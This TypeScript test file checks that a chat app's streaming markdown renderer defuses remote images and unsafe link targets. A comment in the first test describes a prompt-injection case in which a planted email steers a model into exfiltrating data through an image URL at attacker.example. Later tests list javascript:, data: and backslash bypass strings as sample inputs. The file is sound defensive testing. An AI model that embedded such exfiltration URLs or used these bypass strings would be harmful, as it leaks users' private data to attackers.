import * as smd from 'streaming-markdown';
import { describe, expect, it } from 'vitest';

import { streamingMarkdownRenderer } from './streamingRenderer';

/**
 * Stream `markdown` into a fresh element one character at a time — the
 * worst case for a streaming parser, and the way a reply can actually arrive —
 * through the same renderer `Chat` uses.
 */
function stream(markdown: string): HTMLElement {
  const root = document.createElement('div');
  const parser = smd.parser(streamingMarkdownRenderer(root));

  for (const char of markdown) {
    smd.parser_write(parser, char);
  }

  smd.parser_end(parser);

  return root;
}

describe('streamingMarkdownRenderer', () => {
  it('never sets a remote image source: it becomes a link the reader can choose to open', () => {
    // The exfiltration shape: a model steered by a planted email ends its
    // reply with an image whose query string carries what it just read. The
    // stock renderer set `src` on an <img> already in the DOM as the `)`
    // arrived, so the request fired mid-stream.
    const src = 'https://attacker.example/log?d=home+address';
    const root = stream(`Here you go. ![a map](${src})`);

    expect(root.querySelector('img')).toBeNull();
    const link = root.querySelector('a[data-remote-image]');
    expect(link).not.toBeNull();
    expect(link).toHaveAttribute('href', src);
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    expect(link).toHaveTextContent('a map');
  });

  it('names the URL when a remote image has no alt text', () => {
    const src = 'https://attacker.example/p.png';
    const root = stream(`![](${src})`);

    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('a[data-remote-image]')).toHaveTextContent(src);
  });

  it('still renders an own-origin image, with its alt text where a reader can get at it', () => {
    const root = stream('![a photo](/api/files/abc/thumbnail)');

    const image = root.querySelector('img');
    expect(image).toHaveAttribute('src', '/api/files/abc/thumbnail');
    expect(image).toHaveAttribute('alt', 'a photo');
    expect(image).toBeEmptyDOMElement();
  });

  it.each([
    ['protocol-relative', '//attacker.example/p.png'],
    ['backslash, which the URL parser reads as a slash', '/\\attacker.example/p.png'],
  ])('treats a %s source as remote', (_label, src) => {
    const root = stream(`![x](${src})`);

    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('a[data-remote-image]')).toHaveTextContent('x');
  });

  it('does not turn a script URL into a clickable link on the way to refusing it', () => {
    const root = stream('![x](javascript:alert)');

    expect(root.querySelector('img')).toBeNull();
    const link = root.querySelector('a[data-remote-image]');
    expect(link).toHaveTextContent('x');
    expect(link).not.toHaveAttribute('href');
  });

  it('leaves ordinary links alone', () => {
    const root = stream('[the docs](https://example.com/docs)');

    const link = root.querySelector('a');
    expect(link).toHaveAttribute('href', 'https://example.com/docs');
    expect(link).not.toHaveAttribute('data-remote-image');
  });

  it.each([
    ['a script URL', 'javascript:alert%281%29'],
    ['a script URL in mixed case', 'JaVaScRiPt:void%280%29'],
    ['a script URL split by a tab, which the URL parser drops', 'java\tscript:void%280%29'],
    ['a data URL', 'data:text/html;base64,PGI+aGk8L2I+'],
    ['an Android intent', 'intent://scan/#Intent;scheme=zxing;end'],
    ["the app's own deep-link scheme", 'companion://oidc/callback?code=x'],
    ['a protocol-relative path', '//attacker.example/x'],
    ['a protocol-relative path with a backslash', '/\\attacker.example/x'],
  ])('streams %s as a link with no target, so it reads as text and goes nowhere', (_label, target) => {
    const root = stream(`Open [the source](${target}) now.`);

    const link = root.querySelector('a');
    expect(link).toHaveTextContent('the source');
    expect(link).not.toHaveAttribute('href');
    expect(link).not.toHaveAttribute('target');
  });

  it('keeps a site-relative link in this tab, so it stays a page of the app', () => {
    const root = stream('[the event](/events/abc)');

    const link = root.querySelector('a');
    expect(link).toHaveAttribute('href', '/events/abc');
    expect(link).not.toHaveAttribute('target');
  });

  it('opens an off-origin link in a new tab with no opener and no referrer', () => {
    const root = stream('[the docs](https://example.com/docs)');

    const link = root.querySelector('a');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('keeps an absolute link on this origin in this tab', () => {
    const own = `${window.location.origin}/content/abc`;
    const root = stream(`[mine](${own})`);

    const link = root.querySelector('a');
    expect(link).toHaveAttribute('href', own);
    expect(link).not.toHaveAttribute('target');
  });

  it('keeps a mailto link', () => {
    const root = stream('[write](mailto:owner@example.com)');

    expect(root.querySelector('a')).toHaveAttribute('href', 'mailto:owner@example.com');
  });

  it('still links a bare URL the parser autolinks, off-origin rules included', () => {
    const root = stream('see https://example.com/a and more');

    const link = root.querySelector('a');
    expect(link).toHaveAttribute('href', 'https://example.com/a');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });
});
